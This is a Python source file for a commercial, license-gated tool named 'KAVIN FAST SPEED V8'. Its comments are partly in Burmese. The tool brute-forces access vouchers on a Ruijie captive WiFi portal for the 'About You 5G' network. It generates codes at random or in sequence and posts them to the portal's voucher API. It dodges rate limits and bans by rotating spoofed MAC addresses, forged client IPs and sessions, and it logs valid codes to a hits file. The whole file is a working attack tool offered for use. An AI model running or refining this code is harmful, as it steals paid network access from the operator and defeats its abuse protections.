# =====================================================================
# kavinv8.py - KAVIN FAST SPEED V8 (About You 5G Edition)
# Part 1 of 2
# =====================================================================

import os
import time
import random
import string
import json
import asyncio
import aiohttp
import urllib3
import socket
import threading
import requests
import re
from urllib.parse import urlparse, parse_qs, quote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED, HEAVY
from rich.layout import Layout
from rich.table import Table
from rich.align import Align
from rich.progress_bar import ProgressBar

# ⭐ License Module
try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 15
TIMEOUT = 4
RL_SLEEP = 0.5 

# ⭐ About You 5G ရဲ့ လိပ်စာကို အတိအကျ သတ်မှတ်ထားပါတယ်
RUIJIE_BASE = "https://portal-mm-as.ruijienetworks.com"
RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": "Unverified"}

def generate_random_mac():
    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def generate_random_ip():
    return f"192.168.110.{random.randint(2, 254)}"

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(seconds):
    try:
        seconds = int(seconds)
        return f"{seconds // 3600:02d}:{(seconds % 3600) // 60:02d}:{seconds % 60:02d}"
    except Exception: return "00:00:00"

def check_license():
    if not HAS_LICENSE_MODULE:
        return False, "license.py မရှိပါ။ ထည့်သွင်းပေးပါ။"
    try:
        res = _license.check_approval()
        if isinstance(res, tuple):
            return res
        return bool(res), "Valid" if res else "Invalid"
    except Exception as e:
        return False, f"Error: {e}"

def activate_license(key):
    if not HAS_LICENSE_MODULE:
        return False, "license.py မရှိပါ။"
    try:
        return _license.activate(key)
    except Exception as e:
        return False, f"Error: {e}"

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except: return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url',
        'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query:
            params[mk] = query[key][0]
    if 'RES' in query:
        params['RES'] = query['RES'][0]
    return params

# ⭐ Auto ရှာမယ်။ မရရင် RUIJIE_BASE (About You 5G) ကို သုံးမယ်
def auto_detect_portal():
    global RUIJIE_BASE, RUIJIE_WIFIDOG, RUIJIE_VOUCHER
    console.print(Panel(Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")), border_style="cyan", box=ROUNDED))
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})

    try:
        r = session.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5, verify=False)
        if "ruijienetworks" in r.url:
            console.print(f"[bold green][+][/bold green] Detected via Connectivity!")
            parsed = urlparse(r.url)
            RUIJIE_BASE = f"{parsed.scheme}://{parsed.netloc}"
            RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
            RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"
            return r.url
    except: pass

    test_urls = [
        "https://portal-mm-as.ruijienetworks.com",
        "http://portal-mm-as.ruijienetworks.com",
        "https://portal-as.ruijienetworks.com",
        "http://portal-as.ruijienetworks.com"
    ]
    for url in test_urls:
        try:
            res = session.get(url, verify=False, timeout=4)
            if res.status_code in [200, 301, 302]:
                console.print(f"[bold green][+][/bold green] Detected Ruijie Portal: {url}")
                RUIJIE_BASE = url
                RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
                RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"
                return url
        except: pass

    console.print("[yellow][*][/yellow] Checking Gateways...")
    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
    gateways = list(dict.fromkeys(gateways))

    for gw in gateways:
        try:
            res = session.get(f"http://{gw}", timeout=3, allow_redirects=True)
            if "ruijienetworks" in res.url:
                console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
                parsed = urlparse(res.url)
                RUIJIE_BASE = f"{parsed.scheme}://{parsed.netloc}"
                RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
                RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"
                return res.url
        except: pass
        
    console.print(f"[bold yellow][!][/bold yellow] Auto-detect failed. Using Manual URL: {RUIJIE_BASE}")
    return RUIJIE_BASE

async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref):
    base = RUIJIE_WIFIDOG

    temp_params = dict(gw_params)
    temp_params['mac'] = current_mac_ref[0]
    temp_params['ip'] = current_ip_ref[0]

    params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
    full_url = f"{base}?{params_str}"

    headers = {
        'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{current_mac_ref[0]}',
        'Client-Mac': current_mac_ref[0],
        'X-Forwarded-For': current_ip_ref[0],
        'Connection': 'close'
    }

    try:
        session.cookie_jar.clear()
        async with session.get(full_url, headers=headers, timeout=6, allow_redirects=False, ssl=False) as resp:
            if resp.status == 429:
                await asyncio.sleep(5)
                return "BAN", "Rate Limited (429)"
                
            location = resp.headers.get('Location', '')
            
            if location:
                loc_lower = location.lower()
                if ("request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower):
                    return "BAN", "Banned"

                q = parse_qs(urlparse(location).query)
                sid = q.get('sessionId', [None])[0]
                if sid:
                    return {
                        'sessionId': sid,
                        'sign': q.get('sign', [None])[0],
                        'timestamp': q.get('timestamp', [None])[0],
                    }, "REAL"
    except Exception:
        pass

    return {
        'sessionId': f"fake_sess_{random.randint(1000,9999)}",
        'sign': None,
        'timestamp': None
    }, "FAKE"

async def test_code_official(session, sess_data, code, mac, ip):
    url = RUIJIE_VOUCHER
    if sess_data.get('sign') and sess_data.get('timestamp'):
        url += f"&sign={sess_data['sign']}&timestamp={sess_data['timestamp']}"

    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12)",
        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess_data['sessionId']}",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
    }

    payload = {
        "accessCode": code,
        "sessionId": sess_data['sessionId'],
        "apiVersion": 1,
    }
    if sess_data.get('sign'): payload["sign"] = sess_data['sign']
    if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']

    try:
        async with session.post(url, json=payload, headers=headers, timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
            if r.status == 429: return "__RATE_LIMITED__", "N/A"

            text = await r.text()
            if not text: return "__NETWORK_ERROR__", "N/A"

            final_url = str(r.url).lower()
            low = text.lower()
            if ("request%20limited" in final_url or "request limited" in final_url or "request limited" in low or "too many" in low):
                return "__RATE_LIMITED__", "N/A"

            if "session timed out" in low or "invalid session" in low:
                return "__SESSION_EXPIRED__", "N/A"

            real_plan = "N/A"
            try:
                j = json.loads(text)
                j_str = json.dumps(j).lower()
                if "result" in j and isinstance(j["result"], dict):
                    for k, v in j["result"].items():
                        if any(word in str(k).lower() for word in ["plan", "package", "profile", "duration"]):
                            real_plan = str(v)
                            break
                if real_plan == "N/A":
                    m = re.search(r'"(?:plan|package|profile|duration)"\s*:\s*"([^"]+)"', j_str)
                    if m: real_plan = m.group(1)
                    elif "time" in j_str:
                        m2 = re.search(r'"time"\s*:\s*([0-9]+)', j_str)
                        if m2: real_plan = f"{m2.group(1)} secs"
            except: pass

            return text, real_plan
    except asyncio.TimeoutError: return "__TIMEOUT__", "N/A"
    except aiohttp.ClientError: return "__NETWORK_ERROR__", "N/A"
    except Exception as e: return f"__ERROR__:{type(e).__name__}", "N/A"

seq_counter = 0
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    global seq_counter
    try:
        if scan_method == "sequential":
            with seq_lock:
                seq_counter += 1
                current = seq_counter
            if mode == "num": return str(current).zfill(length)
            elif mode == "eng":
                s, n = "", current
                for _ in range(length): s = chr(ord('a') + (n % 26)) + s; n //= 26
                return s
            elif mode == "mix":
                chars = string.ascii_lowercase + string.digits
                s, n = "", current
                for _ in range(length): s = chars[n % 36] + s; n //= 36
                return s
        else:
            if mode == "num": return str(random.randint(0, 10**length - 1)).zfill(length)
            elif mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception: pass
    return ""

def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, status, hits, speed, cur_mac, cur_ip, sess_stat, sess_id, total_target=1000000):
    layout = Layout()
    header_text = Text("⚡ KAVIN FAST SPEED V8 (About You 5G) ⚡", style="bold bright_cyan", justify="center")
    layout.split_column(Layout(Panel(Align.center(header_text), border_style="cyan", box=ROUNDED), size=3), Layout(name="body", ratio=1))

    progress = min(100.0, (tested / total_target) * 100) if total_target > 0 else 0.0

    stats = Table.grid(expand=True, padding=(0, 1))
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold cyan", justify="left")
    stats.add_column(style="bold white", justify="left")
    stats.add_column(style="bold green", justify="left")

    status_style = "bold red" if "ERR" in status.upper() or "TIMEOUT" in status.upper() or "BAN" in status.upper() else "bold green"
    
    if sess_stat == "REAL":
        sess_text = f"REAL ({sess_id[:8]}...)"
        sess_style = "bold green"
    elif sess_stat == "FAKE":
        sess_text = f"FAKE ({sess_id[:8]}...)"
        sess_style = "bold yellow"
    elif sess_stat == "EXPIRED":
        sess_text = "EXPIRED"
        sess_style = "bold red"
    else:
        sess_text = sess_stat
        sess_style = "bold cyan"

    stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
    stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
    stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
    stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
    stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
    stats.add_row("  🔐 Session", f": {sess_text}",             "  📈 Progress", f": {progress:.2f}%", style=sess_style)
    
    stats.add_row("", "", "", "")
    stats.add_row(ProgressBar(total=100, completed=progress, width=50), "", "", "")

    stats_panel = Panel(stats, border_style="magenta", box=ROUNDED)
    check_panel = Panel(Align.center(Text(f"Check Code  :  {current_code if current_code else '------'}", style="bold yellow")), border_style="yellow", box=ROUNDED, height=3)

    v_table = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
    v_table.add_column("Voucher Hits", style="bold green", justify="center")
    v_table.add_column("Real Plan", style="bold green", justify="center")

    for h in hits:
        v_table.add_row(h.get('code', ''), h.get('plan', 'N/A'))

    if not hits: v_table.add_row("", "")

    footer_text = Text.assemble(("✨ Thank You For Choosing @khant7997 Tools ✨", "bold bright_yellow"))
    footer_panel = Panel(Align.center(footer_text), border_style="red", box=ROUNDED, height=3)

    body_layout = Layout()
    body_layout.split_column(
        Layout(stats_panel, size=10),
        Layout(check_panel, size=3), 
        Layout(v_table, ratio=1), 
        Layout(footer_panel, size=3)
    )
    layout["body"].update(body_layout)
    return layout
# =====================================================================
# kavinv8.py - KAVIN FAST SPEED V8 (About You 5G Edition)
# Part 2 of 2
# =====================================================================

async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
    global seq_counter, tried_codes
    tried_codes = set()
    seq_counter = 0

    if not gw_params:
        gw_params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.2",
            "mac": "", "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "About You 5G", "ustate": "0", "mac_req": "1",
            "url": RUIJIE_BASE,
            "chap_id": r"\245",
            "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    mode_str = f"{mode}_{length}"
    hits, tested, start_time = [], 0, time.time()
    current_code = [""]
    current_status = ["Init"]
    sess_stat = ["FAKE"] 
    sess_id = ["--------"] 

    current_mac = [generate_random_mac()]
    current_ip  = [generate_random_ip()]
    sess_data   = [None]

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

    total_target = 1000000
    if mode == "num": total_target = 10**length
    elif mode == "eng": total_target = 26**length
    elif mode == "mix": total_target = 36**length

    conn_limit = aiohttp.TCPConnector(limit=100, ssl=False)
    async with aiohttp.ClientSession(connector=conn_limit) as session:
        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], sess_stat[0], sess_id[0], total_target), refresh_per_second=4, screen=True)

        with live:
            try:
                while True:
                    if sess_data[0] is None:
                        current_status[0] = "Active" 
                        res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)

                        if res == "BAN":
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0] = "BANNED"
                            sess_id[0] = "--------"
                            await asyncio.sleep(2) 
                            continue

                        sess_data[0] = res
                        sess_stat[0] = err_msg 
                        sess_id[0] = res.get('sessionId', '--------') 

                    batch_codes = []
                    while len(batch_codes) < CONCURRENCY_LIMIT:
                        c = gen_code(mode, length, scan_method)
                        if c:
                            with code_lock:
                                if c in tried_codes: continue
                                tried_codes.add(c)
                            batch_codes.append(c)
                    if not batch_codes:
                        await asyncio.sleep(0.01); continue

                    async def bounded_check(code):
                        async with semaphore:
                            return await test_code_official(session, sess_data[0], code, current_mac[0], current_ip[0])

                    tasks = [bounded_check(code) for code in batch_codes]
                    results = await asyncio.gather(*tasks, return_exceptions=True)

                    hit_found_in_batch = False
                    session_expired_in_batch = False

                    for idx, res_tuple in enumerate(results):
                        tested += 1
                        code = batch_codes[idx]
                        current_code[0] = code

                        if isinstance(res_tuple, Exception): continue
                        res, plan = res_tuple

                        if res == "__SESSION_EXPIRED__":
                            sess_data[0] = None
                            sess_stat[0] = "EXPIRED" 
                            session_expired_in_batch = True
                            await asyncio.sleep(1) 
                            break

                        if res == "__RATE_LIMITED__":
                            sess_data[0] = None
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0] = "BANNED"
                            hit_found_in_batch = True
                            await asyncio.sleep(3) 
                            break

                        if res.startswith("__ERROR__:") or res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
                            continue

                        low = res.lower()
                        if "request limited" in low or "blocked" in low or "too many" in low:
                            sess_data[0] = None
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0] = "BANNED"
                            hit_found_in_batch = True
                            await asyncio.sleep(3) 
                            break

                        is_hit = False
                        try:
                            j = json.loads(res)
                            if j.get("success") is True and isinstance(j.get("result"), dict):
                                if j["result"].get("logonUrl"): is_hit = True
                        except Exception:
                            if ('"success":true' in low or '"authresult":"1"' in low or "congratulations" in low): is_hit = True

                        if is_hit:
                            now_str = time.strftime("%H:%M:%S")
                            hits.append({"code": code, "time": now_str, "plan": plan})
                            try:
                                with open(HITS_FILE, "a", encoding="utf-8") as f:
                                    f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                            except Exception: pass
                            
                            sess_data[0] = None
                            current_mac[0] = generate_random_mac()
                            current_ip[0]  = generate_random_ip()
                            sess_stat[0] = "HIT (Refreshing)"
                            hit_found_in_batch = True
                            break

                    elapsed = time.time() - start_time
                    speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
                    
                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], sess_stat[0], sess_id[0], total_target))

                    if hit_found_in_batch: await asyncio.sleep(1)
                    if session_expired_in_batch: await asyncio.sleep(1)

            except (KeyboardInterrupt, asyncio.CancelledError):
                live.stop()
                console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
            except Exception as e:
                live.stop()
                console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")

def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V8 (About You 5G) ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3"): continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]

def ask_length(mode):
    while True:
        show_banner()
        console.print("  [bold bright_white]Choose Voucher Length:[/bold bright_white]\n")
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] ⚡ 6 Characters")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] ⚡ 7 Characters")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ⚡ 8 Characters")
        console.print("  [bold bright_cyan]4.[/bold bright_cyan] ⚡ 9 Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2", "3", "4"): continue
        return {"1": 6, "2": 7, "3": 8, "4": 9}[choice]

def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0": return None
        if choice not in ("1", "2"): continue
        return {"1": "random", "2": "sequential"}[choice]

def run():
    global LICENSE_INFO
    show_banner()
    
    is_valid, expiry_msg = check_license()
    while not is_valid:
        clear_screen()
        console.print(Panel(Align.center(Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_magenta")), border_style="bright_magenta"))
        console.print(Panel(Align.center(Text("🔐 Enter License Key to Continue 🔐\n(license.py မရှိရင် အလုပ်မလုပ်ပါ)", style="bold yellow")), border_style="yellow"))
        key = Prompt.ask("   [bold bright_green]➜ 📝 Paste Key Here[/bold bright_green]").strip()
        
        if key:
            ok, msg = activate_license(key)
            console.print(Panel(Align.center(Text(msg, style="bold bright_green" if ok else "bold red")), border_style="green" if ok else "red"))
            time.sleep(2)
            is_valid, expiry_msg = check_license()
        else: 
            time.sleep(1)
            
    LICENSE_INFO["status"] = expiry_msg

    portal_url = auto_detect_portal()

    gw_params = {
        "stage": "portal",
        "gw_id": "c4b25be7d323",
        "gw_sn": "H1U320P00210A",
        "gw_address": "192.168.7.1",
        "gw_port": "2060",
        "ip": generate_random_ip(),
        "mac": "",
        "slot_num": "14",
        "nasip": "192.168.1.193",
        "ssid": "About You 5G",
        "ustate": "0", "mac_req": "1",
        "url": RUIJIE_BASE,
        "chap_id": r"\245",
        "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
    }

    while True:
        mode = ask_mode()
        if mode is None: return
        length = ask_length(mode)
        if length is None: continue
        scan_method = ask_scan_method()
        if scan_method is None: continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_method=scan_method, gw_params=gw_params))
        except KeyboardInterrupt: pass
        except Exception as e:
            console.print(f"[bold red]Error: {e}[/bold red]")
            time.sleep(2)
        break

def main():
    try:
        run()
    except (KeyboardInterrupt, EOFError):
        console.print("\n\n[bold red]Exiting...[/bold red]\n")
    except Exception as e:
        console.print(f"[bold red]Fatal Error: {e}[/bold red]")
    finally:
        try: clear_screen()
        except Exception: pass
        try:
            console.print("\n\n")
            console.print(Text("✨ Thank You • Contact @khant7997 for Key 🙏", style="bold bright_green"), justify="center")
            console.print("\n\n")
            time.sleep(1)
        except Exception: pass

if __name__ == "__main__":
    main()